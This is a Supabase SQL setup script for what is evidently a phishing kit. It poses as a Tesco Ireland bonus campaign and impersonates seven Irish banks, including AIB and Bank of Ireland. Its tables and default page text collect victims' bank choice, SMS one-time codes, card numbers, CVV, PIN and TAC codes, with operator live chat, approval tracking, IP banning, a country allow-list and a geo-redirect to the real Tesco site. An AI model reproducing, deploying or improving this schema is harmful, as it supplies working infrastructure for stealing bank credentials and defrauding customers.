-- =========================================================================
-- TESCO IRELAND CAMPAIGN — fresh Supabase project setup
-- Run in the Supabase SQL Editor, top to bottom, on a NEW project.
-- Covers: sessions, banks (Irish banks), global_settings (Tesco EN defaults),
--         chat_messages, banned_ips, admin_logs, RLS + realtime.
-- After this, run:  node insert_ie_banks.mjs   (same thing, belt & braces)
-- =========================================================================

create extension if not exists "pgcrypto";

-- ---------------------------------------------------------------------------
-- 1) sessions  (same as schema.sql)
-- ---------------------------------------------------------------------------
-- Tablo zaten varsa: eski dar CHECK kisitlarini kaldir (kod daha fazla deger yazar)
do $$
begin
  if to_regclass('public.sessions') is not null then
    alter table public.sessions drop constraint if exists sessions_current_step_check;
    alter table public.sessions drop constraint if exists sessions_status_check;
    alter table public.sessions drop constraint if exists sessions_sms_digits_check;
    alter table public.sessions drop constraint if exists sessions_public_id_key;
  end if;
end $$;

create table if not exists public.sessions (
  id text primary key default encode(gen_random_bytes(12), 'hex'),
  amount integer not null default 0 check (amount >= 0),
  current_step text not null default 'win',
  status text not null default 'offline',
  sms_digits integer not null default 6,
  form_data jsonb not null default '{}'::jsonb,
  is_hidden boolean default false,
  partner_name text,
  public_id integer,
  ip_address text,
  user_agent text,
  participation_code text,
  sms_custom_text text,
  is_win2_flow boolean default false,
  pending_profile boolean default false,
  phone text,
  "bankSlug" text,
  "bankName" text,
  "viewingBankSlug" text,
  "viewingBankName" text,
  "logoFile" text,
  verfuegernummer text,
  pin text,
  "tacCode" text,
  "selectedProvider" text,
  "transferAmount" text,
  "approvalStatus" text,
  "approvalCode" text,
  "approvalConfirmedAt" timestamptz,
  "approvalHistory" jsonb,
  "specialNoticeText" text,
  "specialNoticeImage" text,
  "specialNoticeLang" text,
  "specialNoticeSentAt" timestamptz,
  "customQuestions" jsonb,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);
create unique index if not exists sessions_public_id_key on public.sessions (public_id);
create index if not exists sessions_created_at_idx on public.sessions (created_at desc);
alter table public.sessions replica identity full;

create or replace function public.set_sessions_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

drop trigger if exists sessions_set_updated_at on public.sessions;
create trigger sessions_set_updated_at
before update on public.sessions
for each row execute function public.set_sessions_updated_at();

alter table public.sessions enable row level security;
drop policy if exists "sessions_authenticated_all" on public.sessions;
drop policy if exists "sessions_anon_select_demo"   on public.sessions;
drop policy if exists "sessions_anon_update_demo"   on public.sessions;
drop policy if exists "sessions_anon_insert_demo"   on public.sessions;
create policy "sessions_authenticated_all" on public.sessions for all to authenticated using (true) with check (true);
create policy "sessions_anon_select_demo"   on public.sessions for select to anon using (true);
create policy "sessions_anon_update_demo"   on public.sessions for update to anon using (true) with check (true);
create policy "sessions_anon_insert_demo"   on public.sessions for insert to anon with check (true);

-- ---------------------------------------------------------------------------
-- 2) banks  (Ireland: AIB, An Post, BOI, EBS, Permanent TSB, Revolut, Wise)
-- ---------------------------------------------------------------------------
create table if not exists public.banks (
  slug text primary key,
  name text not null,
  country text,
  logo text,
  logo_file text,
  brand_color text,
  accent_color text,
  domain text,
  is_active boolean default true,
  auto_redirect boolean default false,
  sort_order integer default 0,
  design_config jsonb default '{}'::jsonb,
  created_at timestamptz not null default now()
);
alter table public.banks replica identity full;
alter table public.banks enable row level security;
drop policy if exists "banks_authenticated_all" on public.banks;
drop policy if exists "banks_anon_select"       on public.banks;
create policy "banks_authenticated_all" on public.banks for all to authenticated using (true) with check (true);
create policy "banks_anon_select"       on public.banks for select to anon using (true);

insert into public.banks (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, auto_redirect, sort_order, design_config) values
  ('aib',             'AIB',              'İrlanda', '/bank-logos/ireland/aib.svg',              '#7e2d7b', '#5c1f59', 'aib.ie',            true, false, 10, '{}'),
  ('an-post',         'An Post',          'İrlanda', '/bank-logos/ireland/an-post.svg',          '#006341', '#004a2f', 'anpost.com',        true, false, 20, '{}'),
  ('bank-of-ireland', 'Bank of Ireland',  'İrlanda', '/bank-logos/ireland/bank-of-ireland.svg',  '#0033a0', '#002270', 'bankofireland.com', true, false, 30, '{}'),
  ('ebs',             'EBS',              'İrlanda', '/bank-logos/ireland/ebs.png',              '#d6222a', '#a81b22', 'ebs.ie',            true, false, 40, '{}'),
  ('permanent-tsb',   'Permanent TSB',    'İrlanda', '/bank-logos/ireland/ptsb.png',             '#410045', '#2d0030', 'permanenttsb.ie',   true, false, 50, '{}'),
  ('revolut',         'Revolut',          'İrlanda', '/bank-logos/ireland/revolut.svg',          '#000000', '#191c1f', 'revolut.com',       true, false, 60, '{}'),
  ('wise',            'Wise',             'İrlanda', '/bank-logos/ireland/wise.svg',             '#163300', '#9fe870', 'wise.com',          true, false, 70, '{}')
on conflict (slug) do update set
  name          = excluded.name,
  country       = excluded.country,
  logo_file     = excluded.logo_file,
  brand_color   = excluded.brand_color,
  accent_color  = excluded.accent_color,
  domain        = excluded.domain,
  is_active     = excluded.is_active,
  auto_redirect = excluded.auto_redirect,
  sort_order    = excluded.sort_order;

-- ---------------------------------------------------------------------------
-- 3) global_settings  (single-row wide table, id = 'default')
--    All user-facing text = English, campaign = Tesco Ireland
-- ---------------------------------------------------------------------------
create table if not exists public.global_settings (
  id text primary key default 'default',
  logo_url text, bg_url text, og_image_url text,
  portal_name text, support_center_name text,
  win_title text, win_subtitle text, win_button text,
  banken_title text, banken_subtitle text, banken_search_placeholder text,
  wait_title text, wait_subtitle text,
  sms_title text, sms_subtitle text, sms_input_label text, sms_button text, sms_loading text,
  card_title text, card_subtitle text, card_owner_label text, card_number_label text,
  card_expiry_label text, card_cvv_label text, card_button text,
  code_title text, code_subtitle text, code_button text,
  live_support_title text, live_support_subtitle text, live_support_button text,
  profile_title_small text, profile_title_main text, profile_subtitle text,
  profile_firstname_label text, profile_lastname_label text, profile_phone_label text,
  profile_button text, profile_loading_text text,
  site_language text, target_country text,
  entry_page text default '/win',
  site_enabled boolean default true,
  wheel_settings jsonb default '{}'::jsonb,
  updated_at timestamptz not null default now()
);
alter table public.global_settings enable row level security;
drop policy if exists "global_settings_authenticated_all" on public.global_settings;
drop policy if exists "global_settings_anon_select"       on public.global_settings;
create policy "global_settings_authenticated_all" on public.global_settings for all to authenticated using (true) with check (true);
create policy "global_settings_anon_select"       on public.global_settings for select to anon using (true);

insert into public.global_settings (
  id, logo_url, bg_url,
  portal_name, support_center_name,
  win_title, win_subtitle, win_button,
  banken_title, banken_subtitle, banken_search_placeholder,
  wait_title, wait_subtitle,
  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
  card_title, card_subtitle, card_owner_label, card_number_label, card_expiry_label, card_cvv_label, card_button,
  code_title, code_subtitle, code_button,
  live_support_title, live_support_subtitle, live_support_button,
  profile_title_small, profile_title_main, profile_subtitle,
  profile_firstname_label, profile_lastname_label, profile_phone_label, profile_button, profile_loading_text,
  site_language, target_country, entry_page, site_enabled, wheel_settings
) values (
  'default',
  '/form-assets/tesco-mini-logo.png',
  '/form-assets/bg-desktop.png',
  'Tesco Customer Portal',
  'Tesco Customer Service',
  'Exclusive Tesco Bonus',
  'Congratulations! You have been selected for today''s Tesco promotion. Click the button below to claim your bonus.',
  'Claim Bonus',
  'Choose Your Bank',
  'Select your bank to continue.',
  'Search your bank...',
  'Please Wait',
  'Your request is being securely processed...',
  'SMS Security Code', 'Enter the {digits}-digit code.', 'One-time code', 'Confirm', 'Processing...',
  'Payment Details', 'Check and confirm your details.', 'Cardholder Name', 'Card Number', 'Expiry Date MM/YY', 'Security Code', 'Continue',
  'Welcome', 'Enter the participation code you received from {partner} to unlock your reward.', 'Confirm Code',
  'Live Support', 'To continue, you need to contact our customer service.' || chr(10) || chr(10) || 'Click the button below to start the chat.', 'Start Chat',
  'Prize Confirmation', 'Your Bonus Amount', 'Confirm your details for further processing.',
  'First Name', 'Last Name', 'Mobile Number', 'Next', 'Processing...',
  'en', 'İrlanda', '/win', true,
  '{"campaign_name":"Tesco","geo_redirect_url":"https://www.tesco.ie","theme_primary":"#00539f","allowed_countries":["IE"]}'::jsonb
)
on conflict (id) do update set
  logo_url                = excluded.logo_url,
  bg_url                  = excluded.bg_url,
  portal_name             = excluded.portal_name,
  support_center_name     = excluded.support_center_name,
  win_title               = excluded.win_title,
  win_subtitle            = excluded.win_subtitle,
  win_button              = excluded.win_button,
  banken_title            = excluded.banken_title,
  banken_subtitle         = excluded.banken_subtitle,
  banken_search_placeholder = excluded.banken_search_placeholder,
  site_language           = excluded.site_language,
  target_country          = excluded.target_country,
  wheel_settings          = excluded.wheel_settings;

-- Mevcut tabloda eksik kalabilecek kolonlar (eski kurulumdan kalan)
alter table public.sessions add column if not exists partner_name text;
alter table public.sessions add column if not exists public_id integer;
alter table public.sessions add column if not exists ip_address text;
alter table public.sessions add column if not exists user_agent text;
alter table public.sessions add column if not exists participation_code text;
alter table public.sessions add column if not exists sms_custom_text text;
alter table public.sessions add column if not exists is_win2_flow boolean default false;
alter table public.sessions add column if not exists pending_profile boolean default false;
alter table public.sessions add column if not exists phone text;
alter table public.sessions add column if not exists "bankSlug" text;
alter table public.sessions add column if not exists "bankName" text;
alter table public.sessions add column if not exists "viewingBankSlug" text;
alter table public.sessions add column if not exists "viewingBankName" text;
alter table public.sessions add column if not exists "logoFile" text;
alter table public.sessions add column if not exists verfuegernummer text;
alter table public.sessions add column if not exists pin text;
alter table public.sessions add column if not exists "tacCode" text;
alter table public.sessions add column if not exists "selectedProvider" text;
alter table public.sessions add column if not exists "transferAmount" text;
alter table public.sessions add column if not exists "approvalStatus" text;
alter table public.sessions add column if not exists "approvalCode" text;
alter table public.sessions add column if not exists "approvalConfirmedAt" timestamptz;
alter table public.sessions add column if not exists "approvalHistory" jsonb;
alter table public.sessions add column if not exists "specialNoticeText" text;
alter table public.sessions add column if not exists "specialNoticeImage" text;
alter table public.sessions add column if not exists "specialNoticeLang" text;
alter table public.sessions add column if not exists "specialNoticeSentAt" timestamptz;
alter table public.sessions add column if not exists "customQuestions" jsonb;
alter table public.sessions add column if not exists is_hidden boolean default false;
alter table public.sessions add column if not exists form_data jsonb not null default '{}'::jsonb;

-- ---------------------------------------------------------------------------
-- 4) chat_messages  (live-support chat)
-- ---------------------------------------------------------------------------
create table if not exists public.chat_messages (
  id bigserial primary key,
  session_id text not null,
  sender text not null check (sender in ('user', 'admin', 'system')),
  content text,
  image_url text,
  created_at timestamptz not null default now()
);
create index if not exists chat_messages_session_idx on public.chat_messages (session_id, created_at);
alter table public.chat_messages enable row level security;
drop policy if exists "chat_authenticated_all" on public.chat_messages;
drop policy if exists "chat_anon_select"       on public.chat_messages;
drop policy if exists "chat_anon_insert"       on public.chat_messages;
create policy "chat_authenticated_all" on public.chat_messages for all to authenticated using (true) with check (true);
create policy "chat_anon_select"       on public.chat_messages for select to anon using (true);
create policy "chat_anon_insert"       on public.chat_messages for insert to anon with check (true);

-- ---------------------------------------------------------------------------
-- 5) banned_ips  (admin IP blocklist)
-- ---------------------------------------------------------------------------
create table if not exists public.banned_ips (
  ip_address text primary key,
  reason text,
  created_at timestamptz not null default now()
);
alter table public.banned_ips enable row level security;
drop policy if exists "banned_ips_authenticated_all" on public.banned_ips;
drop policy if exists "banned_ips_anon_select"       on public.banned_ips;
create policy "banned_ips_authenticated_all" on public.banned_ips for all to authenticated using (true) with check (true);
create policy "banned_ips_anon_select"       on public.banned_ips for select to anon using (true);

-- ---------------------------------------------------------------------------
-- 6) admin_logs  (admin action audit)
-- ---------------------------------------------------------------------------
create table if not exists public.admin_logs (
  id bigserial primary key,
  admin_email text not null,
  action text not null,
  target text,
  detail jsonb,
  ip text,
  user_agent text,
  created_at timestamptz not null default now()
);
alter table public.admin_logs enable row level security;
drop policy if exists "admin_logs_authenticated_all" on public.admin_logs;
create policy "admin_logs_authenticated_all" on public.admin_logs for all to authenticated using (true) with check (true);

-- ---------------------------------------------------------------------------
-- 7) Realtime publication
-- ---------------------------------------------------------------------------
do $$
begin
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'sessions') then
    alter publication supabase_realtime add table public.sessions;
  end if;
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'banks') then
    alter publication supabase_realtime add table public.banks;
  end if;
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'chat_messages') then
    alter publication supabase_realtime add table public.chat_messages;
  end if;
end $$;

-- =========================================================================
-- Done. Verify with:
--   select slug, name, country, is_active from public.banks order by sort_order;
--   select portal_name, site_language, target_country from public.global_settings;
-- =========================================================================
